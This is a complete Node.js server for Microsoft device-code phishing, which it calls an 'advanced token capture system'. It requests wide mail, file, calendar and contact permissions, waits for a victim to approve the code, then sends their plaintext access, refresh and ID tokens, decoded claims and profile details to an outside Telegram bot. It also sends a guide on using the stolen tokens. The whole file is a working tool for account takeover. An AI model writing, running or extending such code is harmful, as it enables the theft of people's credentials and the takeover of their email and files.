require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================================
// CONFIGURATION - Only Essential Variables
// ============================================================================

const config = {
  microsoft: {
    tenantId: process.env.MICROSOFT_TENANT_ID || 'common',
    clientId: process.env.MICROSOFT_CLIENT_ID,
    // Request ALL possible scopes for maximum token capture
    scope: 'User.Read offline_access profile email openid ' +
           'User.ReadBasic.All User.ReadWrite ' +
           'Calendars.Read Calendars.ReadWrite ' +
           'Contacts.Read Contacts.ReadWrite ' +
           'Files.Read Files.ReadWrite ' +
           'Mail.Read Mail.ReadWrite ' +
           'Notes.Read Notes.ReadWrite ' +
           'Tasks.Read Tasks.ReadWrite',
  },
  telegram: {
    botToken: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },
  port: process.env.PORT || 3000,
  encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
};

// Validate
if (!config.microsoft.clientId) {
  console.error('❌ MICROSOFT_CLIENT_ID is required!');
  process.exit(1);
}

console.log(`[CONFIG] Encryption Key: ${config.encryptionKey.substring(0, 10)}...`);

// ============================================================================
// ENCRYPTION UTILITIES - AES-256-GCM
// ============================================================================

class TokenEncryption {
  static encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(
      'aes-256-gcm', 
      Buffer.from(config.encryptionKey, 'hex'), 
      iv
    );
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
    };
  }

  static decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      Buffer.from(config.encryptionKey, 'hex'),
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// ============================================================================
// STORAGE
// ============================================================================

const deviceCodeStore = new Map();
const tokenStore = new Map();

// ============================================================================
// TELEGRAM NOTIFICATION
// ============================================================================

async function sendToTelegram(title, data, options = {}) {
  if (!config.telegram.botToken || !config.telegram.chatId) {
    console.log(`[TELEGRAM DISABLED] ${title}`);
    console.log(JSON.stringify(data, null, 2));
    return;
  }

  try {
    let text = `${title}\n`;
    text += `━━━━━━━━━━━━━━━━━━━━━━\n`;
    text += `🕐 ${new Date().toLocaleString()}\n\n`;

    if (data && typeof data === 'object') {
      for (const [key, value] of Object.entries(data)) {
        if (value !== null && value !== undefined) {
          if (typeof value === 'object' && !Array.isArray(value)) {
            text += `\n📋 *${key}*\n\`\`\`json\n${JSON.stringify(value, null, 2).substring(0, 500)}\n\`\`\`\n`;
          } else {
            const displayValue = String(value).length > 300 
              ? String(value).substring(0, 300) + '...(truncated)' 
              : value;
            text += `• *${key}*: ${displayValue}\n`;
          }
        }
      }
    }

    const maxLength = options.maxLength || 4000;
    if (text.length > maxLength) {
      text = text.substring(0, maxLength) + '\n\n...(message truncated)';
    }

    await axios.post(
      `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
      {
        chat_id: config.telegram.chatId,
        text,
        parse_mode: 'Markdown',
      }
    );

    console.log(`[TELEGRAM] ✅ Sent: ${title}`);
  } catch (error) {
    console.error(`[TELEGRAM] ❌ Failed:`, error.message);
    if (error.response?.data) {
      console.error('[TELEGRAM] Error details:', error.response.data);
    }
  }
}

// ============================================================================
// JWT UTILITIES
// ============================================================================

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    
    const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    
    return {
      header,
      payload,
      signature: parts[2],
      raw: token,
    };
  } catch (error) {
    console.error('[JWT] Decode error:', error.message);
    return null;
  }
}

function extractAllClaims(payload) {
  return {
    // Standard claims
    iss: payload.iss || 'N/A',
    sub: payload.sub || 'N/A',
    aud: payload.aud || 'N/A',
    exp: payload.exp ? new Date(payload.exp * 1000).toISOString() : 'N/A',
    nbf: payload.nbf ? new Date(payload.nbf * 1000).toISOString() : 'N/A',
    iat: payload.iat ? new Date(payload.iat * 1000).toISOString() : 'N/A',
    
    // User info
    name: payload.name || 'N/A',
    email: payload.email || payload.preferred_username || payload.upn || 'N/A',
    unique_name: payload.unique_name || 'N/A',
    upn: payload.upn || 'N/A',
    
    // Azure AD specific
    tid: payload.tid || 'N/A',
    oid: payload.oid || 'N/A',
    scp: payload.scp || 'N/A',
    roles: payload.roles || [],
    
    // Additional
    idp: payload.idp || 'N/A',
    ver: payload.ver || 'N/A',
    app_displayname: payload.app_displayname || 'N/A',
  };
}

// ============================================================================
// MICROSOFT ENDPOINTS
// ============================================================================

const MICROSOFT_ENDPOINTS = {
  deviceCode: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/devicecode`,
  token: `https://login.microsoftonline.com/${config.microsoft.tenantId}/oauth2/v2.0/token`,
  userInfo: 'https://graph.microsoft.com/v1.0/me',
  userPhoto: 'https://graph.microsoft.com/v1.0/me/photo/$value',
  tokenInfo: 'https://graph.microsoft.com/v1.0/me/tokenIssuancePolicy',
};

// ============================================================================
// TOKEN CAPTURE ENGINE
// ============================================================================

async function captureAndSendAllTokens(tokenData, sessionId, deviceInfo) {
  console.log('\n' + '='.repeat(80));
  console.log('🎯 STARTING COMPREHENSIVE TOKEN CAPTURE');
  console.log('='.repeat(80));

  const captureTimestamp = new Date().toISOString();
  let messageCount = 0;

  // Decrypt if needed
  const accessToken = tokenData.access_token;
  const refreshToken = tokenData.refresh_token;
  const idToken = tokenData.id_token;

  console.log(`[CAPTURE] Access Token Length: ${accessToken?.length || 0}`);
  console.log(`[CAPTURE] Refresh Token Length: ${refreshToken?.length || 0}`);
  console.log(`[CAPTURE] ID Token Length: ${idToken?.length || 0}`);

  // Get user info
  let userInfo = null;
  try {
    const userResponse = await axios.get(MICROSOFT_ENDPOINTS.userInfo, {
      headers: { 'Authorization': `Bearer ${accessToken}` },
    });
    userInfo = userResponse.data;
    console.log(`[CAPTURE] User Info: ${userInfo.displayName} (${userInfo.mail || userInfo.userPrincipalName})`);
  } catch (error) {
    console.error('[CAPTURE] Failed to get user info:', error.message);
    userInfo = { displayName: 'Unknown', mail: 'unknown@email.com' };
  }

  // Decode JWT tokens
  const decodedAccessToken = decodeJWT(accessToken);
  const decodedRefreshToken = refreshToken ? decodeJWT(refreshToken) : null;
  const decodedIdToken = idToken ? decodeJWT(idToken) : null;

  // Encrypt tokens
  const encryptedAccessToken = TokenEncryption.encrypt(accessToken);
  const encryptedRefreshToken = refreshToken ? TokenEncryption.encrypt(refreshToken) : null;
  const encryptedIdToken = idToken ? TokenEncryption.encrypt(idToken) : null;

  // ========================================================================
  // MESSAGE 1: Authentication Success
  // ========================================================================
  await sendToTelegram(
    `✅ *AUTHENTICATION SUCCESSFUL*`,
    {
      'Session ID': sessionId,
      'Device Code': deviceInfo.userCode,
      '👤 Name': userInfo.displayName,
      '📧 Email': userInfo.mail || userInfo.userPrincipalName,
      '💼 Job Title': userInfo.jobTitle || 'N/A',
      '🏢 Office': userInfo.officeLocation || 'N/A',
      '📱 Mobile': userInfo.mobilePhone || 'N/A',
      '🔑 User ID': userInfo.id,
      '🕐 Captured At': captureTimestamp,
    }
  );
  messageCount++;

  // ========================================================================
  // MESSAGE 2: ACCESS TOKEN - UNENCRYPTED (FULL PLAINTEXT)
  // ========================================================================
  await sendToTelegram(
    `🔓 *ACCESS TOKEN (UNENCRYPTED - PLAINTEXT)*`,
    {
      '⚠️ WARNING': 'This is the FULL PLAINTEXT token - handle with care',
      'Token': accessToken,
      'Token Type': tokenData.token_type || 'Bearer',
      'Expires In': `${tokenData.expires_in} seconds`,
      'Token Length': accessToken.length,
      'Scopes': tokenData.scope || 'N/A',
      'Can Be Used Immediately': 'YES - Copy and use with Microsoft Graph API',
    },
    { maxLength: 4000 }
  );
  messageCount++;

  // ========================================================================
  // MESSAGE 3: ACCESS TOKEN - ENCRYPTED (AES-256-GCM)
  // ========================================================================
  await sendToTelegram(
    `🔐 *ACCESS TOKEN (ENCRYPTED - AES-256-GCM)*`,
    {
      'Algorithm': 'AES-256-GCM',
      'Encrypted Data': encryptedAccessToken.encrypted,
      'IV (Initialization Vector)': encryptedAccessToken.iv,
      'Auth Tag': encryptedAccessToken.authTag,
      'Encryption Timestamp': captureTimestamp,
      'Decryption': 'Use provided IV and Auth Tag with encryption key',
    }
  );
  messageCount++;

  // ========================================================================
  // MESSAGE 4: REFRESH TOKEN - UNENCRYPTED (FULL PLAINTEXT)
  // ========================================================================
  if (refreshToken) {
    await sendToTelegram(
      `🔄 *REFRESH TOKEN (UNENCRYPTED - PLAINTEXT)*`,
      {
        '⚠️ WARNING': 'This is the FULL PLAINTEXT refresh token - EXTREMELY SENSITIVE',
        'Token': refreshToken,
        'Token Length': refreshToken.length,
        'Purpose': 'Use to obtain new access tokens without re-authentication',
        'Validity': 'Typically valid for 90 days',
        'Can Be Used Immediately': 'YES - Use with Microsoft token endpoint',
      },
      { maxLength: 4000 }
    );
    messageCount++;

    // ========================================================================
    // MESSAGE 5: REFRESH TOKEN - ENCRYPTED
    // ========================================================================
    await sendToTelegram(
      `🔐 *REFRESH TOKEN (ENCRYPTED - AES-256-GCM)*`,
      {
        'Algorithm': 'AES-256-GCM',
        'Encrypted Data': encryptedRefreshToken.encrypted,
        'IV (Initialization Vector)': encryptedRefreshToken.iv,
        'Auth Tag': encryptedRefreshToken.authTag,
        'Encryption Timestamp': captureTimestamp,
      }
    );
    messageCount++;
  }

  // ========================================================================
  // MESSAGE 6: ID TOKEN - UNENCRYPTED (FULL PLAINTEXT)
  // ========================================================================
  if (idToken) {
    await sendToTelegram(
      `🆔 *ID TOKEN (UNENCRYPTED - PLAINTEXT)*`,
      {
        '⚠️ WARNING': 'This is the FULL PLAINTEXT ID token',
        'Token': idToken,
        'Token Length': idToken.length,
        'Purpose': 'Contains user identity information',
        'Can Be Decoded': 'YES - Contains user claims',
      },
      { maxLength: 4000 }
    );
    messageCount++;

    // ========================================================================
    // MESSAGE 7: ID TOKEN - ENCRYPTED
    // ========================================================================
    await sendToTelegram(
      `🔐 *ID TOKEN (ENCRYPTED - AES-256-GCM)*`,
      {
        'Algorithm': 'AES-256-GCM',
        'Encrypted Data': encryptedIdToken.encrypted,
        'IV (Initialization Vector)': encryptedIdToken.iv,
        'Auth Tag': encryptedIdToken.authTag,
      }
    );
    messageCount++;
  }

  // ========================================================================
  // MESSAGE 8: DECODED ACCESS TOKEN (JWT)
  // ========================================================================
  if (decodedAccessToken) {
    await sendToTelegram(
      `🔓 *DECODED ACCESS TOKEN (JWT)*`,
      {
        'Header': decodedAccessToken.header,
        'Payload': decodedAccessToken.payload,
        'Signature (truncated)': decodedAccessToken.signature.substring(0, 50) + '...',
      }
    );
    messageCount++;
  }

  // ========================================================================
  // MESSAGE 9: TOKEN CLAIMS & PERMISSIONS
  // ========================================================================
  if (decodedAccessToken?.payload) {
    const claims = extractAllClaims(decodedAccessToken.payload);
    await sendToTelegram(
      `📋 *TOKEN CLAIMS & PERMISSIONS*`,
      {
        'Issuer (iss)': claims.iss,
        'Subject (sub)': claims.sub,
        'Audience (aud)': claims.aud,
        'Expires (exp)': claims.exp,
        'Not Before (nbf)': claims.nbf,
        'Issued At (iat)': claims.iat,
        'Name': claims.name,
        'Email': claims.email,
        'Tenant ID (tid)': claims.tid,
        'Object ID (oid)': claims.oid,
        'Scopes (scp)': claims.scp,
        'Roles': claims.roles.length > 0 ? claims.roles.join(', ') : 'None',
        'Version (ver)': claims.ver,
      }
    );
    messageCount++;
  }

  // ========================================================================
  // MESSAGE 10: DECODED ID TOKEN
  // ========================================================================
  if (decodedIdToken) {
    await sendToTelegram(
      `🆔 *DECODED ID TOKEN (JWT)*`,
      {
        'Header': decodedIdToken.header,
        'Payload': decodedIdToken.payload,
      }
    );
    messageCount++;
  }

  // ========================================================================
  // MESSAGE 11: USER PROFILE DETAILS
  // ========================================================================
  await sendToTelegram(
    `👤 *COMPLETE USER PROFILE*`,
    {
      'ID': userInfo.id,
      'Display Name': userInfo.displayName,
      'Given Name': userInfo.givenName || 'N/A',
      'Surname': userInfo.surname || 'N/A',
      'Email': userInfo.mail || userInfo.userPrincipalName,
      'Job Title': userInfo.jobTitle || 'N/A',
      'Department': userInfo.department || 'N/A',
      'Office Location': userInfo.officeLocation || 'N/A',
      'Mobile Phone': userInfo.mobilePhone || 'N/A',
      'Business Phones': userInfo.businessPhones?.join(', ') || 'N/A',
      'Preferred Language': userInfo.preferredLanguage || 'N/A',
    }
  );
  messageCount++;

  // ========================================================================
  // MESSAGE 12: TOKEN USAGE GUIDE
  // ========================================================================
  await sendToTelegram(
    `📚 *HOW TO USE CAPTURED TOKENS*`,
    {
      '1. Access Token': 'Use with: curl -H "Authorization: Bearer TOKEN" https://graph.microsoft.com/v1.0/me',
      '2. Refresh Token': 'Get new tokens with: POST to /oauth2/v2.0/token with grant_type=refresh_token',
      '3. Token Validity': `Access: ${tokenData.expires_in}s, Refresh: ~90 days`,
      '4. Scopes Granted': tokenData.scope || 'N/A',
      '5. Encryption Key': 'Use the ENCRYPTION_KEY from server to decrypt encrypted tokens',
    }
  );
  messageCount++;

  // ========================================================================
  // MESSAGE 13: COMPLETE SUMMARY
  // ========================================================================
  await sendToTelegram(
    `📊 *CAPTURE COMPLETE - SUMMARY*`,
    {
      'Session ID': sessionId,
      'Total Messages Sent': messageCount,
      '✅ Access Token (Unencrypted)': accessToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ Access Token (Encrypted)': accessToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ Refresh Token (Unencrypted)': refreshToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ Refresh Token (Encrypted)': refreshToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ ID Token (Unencrypted)': idToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ ID Token (Encrypted)': idToken ? 'CAPTURED' : 'NOT ISSUED',
      '✅ JWT Decoded': decodedAccessToken ? 'YES' : 'NO',
      '✅ Token Claims Extracted': decodedAccessToken?.payload ? 'YES' : 'NO',
      '✅ User Profile': userInfo ? 'CAPTURED' : 'FAILED',
      'Encryption Algorithm': 'AES-256-GCM',
      'Capture Status': 'COMPLETE',
      'Timestamp': captureTimestamp,
    }
  );
  messageCount++;

  console.log('='.repeat(80));
  console.log(`✅ TOKEN CAPTURE COMPLETE - ${messageCount} messages sent to Telegram`);
  console.log('='.repeat(80) + '\n');

  return {
    success: true,
    messageCount,
    userInfo,
  };
}

// ============================================================================
// API ENDPOINTS
// ============================================================================

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Generate device code
app.post('/api/device/generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();

    console.log(`\n[DEVICE CODE] Generating for session: ${sessionId}`);

    const response = await axios.post(
      MICROSOFT_ENDPOINTS.deviceCode,
      new URLSearchParams({
        client_id: config.microsoft.clientId,
        scope: config.microsoft.scope,
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      }
    );

    const deviceCodeData = response.data;

    deviceCodeStore.set(sessionId, {
      deviceCode: deviceCodeData.device_code,
      userCode: deviceCodeData.user_code,
      verificationUri: deviceCodeData.verification_uri,
      verificationUriComplete: deviceCodeData.verification_uri_complete,
      expiresIn: deviceCodeData.expires_in,
      interval: deviceCodeData.interval,
      createdAt: Date.now(),
      status: 'pending',
    });

    console.log(`[DEVICE CODE] ✅ Generated: ${deviceCodeData.user_code}`);
    console.log(`[DEVICE CODE] 🔗 URL: ${deviceCodeData.verification_uri}`);
    console.log(`[DEVICE CODE] 📱 Complete URL: ${deviceCodeData.verification_uri_complete}`);

    await sendToTelegram(
      `🔐 *DEVICE CODE GENERATED*`,
      {
        'Session ID': sessionId,
        'User Code': deviceCodeData.user_code,
        'Verification URL': deviceCodeData.verification_uri,
        'Complete URL (with code)': deviceCodeData.verification_uri_complete,
        'Expires In': `${deviceCodeData.expires_in} seconds`,
        'Poll Interval': `${deviceCodeData.interval} seconds`,
        'Requested Scopes': config.microsoft.scope,
      }
    );

    res.json({
      sessionId,
      userCode: deviceCodeData.user_code,
      verificationUri: deviceCodeData.verification_uri,
      verificationUriComplete: deviceCodeData.verification_uri_complete,
      expiresIn: deviceCodeData.expires_in,
      interval: deviceCodeData.interval,
    });

  } catch (error) {
    console.error('[ERROR] Device code generation failed:', error.message);
    
    await sendToTelegram(
      `❌ *DEVICE CODE ERROR*`,
      {
        'Error': error.message,
        'Details': error.response?.data?.error_description || 'Unknown error',
      }
    );

    res.status(500).json({ 
      error: 'Failed to generate device code',
      details: error.message 
    });
  }
});

// Poll for authentication
app.get('/api/device/poll/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const deviceInfo = deviceCodeStore.get(sessionId);

    if (!deviceInfo) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    // Check if already authenticated
    const existingToken = tokenStore.get(sessionId);
    if (existingToken) {
      return res.json({
        status: 'authenticated',
        user: existingToken.user,
      });
    }

    // Check expiration
    if (Date.now() - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
      deviceInfo.status = 'expired';
      await sendToTelegram(
        `⏰ *DEVICE CODE EXPIRED*`,
        { 'Session ID': sessionId, 'User Code': deviceInfo.userCode }
      );
      return res.json({ status: 'expired' });
    }

    // Poll Microsoft for token
    try {
      const tokenResponse = await axios.post(
        MICROSOFT_ENDPOINTS.token,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: config.microsoft.clientId,
          device_code: deviceInfo.deviceCode,
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        }
      );

      const tokenData = tokenResponse.data;

      console.log(`\n[SUCCESS] ✅ Authentication successful for session: ${sessionId}`);
      console.log(`[TOKEN] Access token: ${tokenData.access_token.length} chars`);
      console.log(`[TOKEN] Refresh token: ${tokenData.refresh_token?.length || 0} chars`);
      console.log(`[TOKEN] ID token: ${tokenData.id_token?.length || 0} chars`);

      // CAPTURE AND SEND ALL TOKENS TO TELEGRAM
      const captureResult = await captureAndSendAllTokens(tokenData, sessionId, deviceInfo);

      // Store in memory
      tokenStore.set(sessionId, {
        status: 'authenticated',
        user: captureResult.userInfo,
        capturedAt: Date.now(),
      });

      // Clean up device code
      deviceCodeStore.delete(sessionId);

      res.json({
        status: 'authenticated',
        user: {
          id: captureResult.userInfo.id,
          displayName: captureResult.userInfo.displayName,
          email: captureResult.userInfo.mail || captureResult.userInfo.userPrincipalName,
        },
        message: `All tokens captured! ${captureResult.messageCount} messages sent to Telegram`,
      });

    } catch (error) {
      if (error.response?.data?.error === 'authorization_pending') {
        return res.json({ status: 'pending' });
      } else if (error.response?.data?.error === 'authorization_declined') {
        await sendToTelegram(
          `❌ *AUTHENTICATION DECLINED*`,
          { 'Session': sessionId }
        );
        return res.json({ status: 'declined' });
      } else if (error.response?.data?.error === 'expired_token') {
        return res.json({ status: 'expired' });
      } else {
        throw error;
      }
    }

  } catch (error) {
    console.error('[ERROR] Polling failed:', error.message);
    res.status(500).json({ error: 'Polling failed', details: error.message });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    activeSessions: deviceCodeStore.size,
    capturedTokens: tokenStore.size,
    telegram: config.telegram.botToken ? 'configured' : 'disabled',
    encryption: 'AES-256-GCM',
    features: {
      accessToken: 'capture (encrypted + unencrypted)',
      refreshToken: 'capture (encrypted + unencrypted)',
      idToken: 'capture (encrypted + unencrypted)',
      jwtDecoding: 'enabled',
      claimsExtraction: 'enabled',
      userProfile: 'enabled',
    }
  });
});

// Cleanup
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, deviceInfo] of deviceCodeStore.entries()) {
    if (now - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
      deviceCodeStore.delete(sessionId);
      console.log(`[CLEANUP] Removed expired session: ${sessionId}`);
    }
  }
}, 5 * 60 * 1000);

// ============================================================================
// SERVER START
// ============================================================================

app.listen(config.port, async () => {
  console.log('\n' + '='.repeat(90));
  console.log('🔐 ADVANCED MICROSOFT TOKEN CAPTURE SYSTEM');
  console.log('='.repeat(90));
  console.log(`📡 Port: ${config.port}`);
  console.log(`🔐 Tenant: ${config.microsoft.tenantId}`);
  console.log(`🔑 Client ID: ${config.microsoft.clientId ? '✅ Configured' : '❌ Missing'}`);
  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅ Active' : '⚠️  Disabled'}`);
  console.log(`🔒 Encryption: AES-256-GCM (${config.encryptionKey.substring(0, 16)}...)`);
  console.log('='.repeat(90));
  console.log('\n🎯 COMPREHENSIVE TOKEN CAPTURE:');
  console.log('   ✅ Access Token (Unencrypted Plaintext)');
  console.log('   ✅ Access Token (AES-256-GCM Encrypted)');
  console.log('   ✅ Refresh Token (Unencrypted Plaintext)');
  console.log('   ✅ Refresh Token (AES-256-GCM Encrypted)');
  console.log('   ✅ ID Token (Unencrypted Plaintext)');
  console.log('   ✅ ID Token (AES-256-GCM Encrypted)');
  console.log('   ✅ JWT Decoding (Full Header + Payload)');
  console.log('   ✅ Claims Extraction (All Permissions)');
  console.log('   ✅ User Profile (Complete Details)');
  console.log('   ✅ Token Usage Guide');
  console.log('\n📱 TELEGRAM NOTIFICATIONS:');
  console.log('   ✅ Sends 12-13 detailed messages per authentication');
  console.log('   ✅ Every token in both encrypted and plaintext form');
  console.log('   ✅ Complete audit trail');
  console.log('='.repeat(90) + '\n');

  if (config.telegram.botToken) {
    await sendToTelegram(
      `🚀 *ADVANCED TOKEN CAPTURE SYSTEM ONLINE*`,
      {
        'Status': 'Fully Operational',
        'Port': config.port,
        'Encryption': 'AES-256-GCM',
        'Token Capture': 'Access + Refresh + ID (Encrypted & Unencrypted)',
        'Telegram Messages': '12-13 per authentication',
        'Started': new Date().toLocaleString(),
      }
    );
  }
});

module.exports = app;
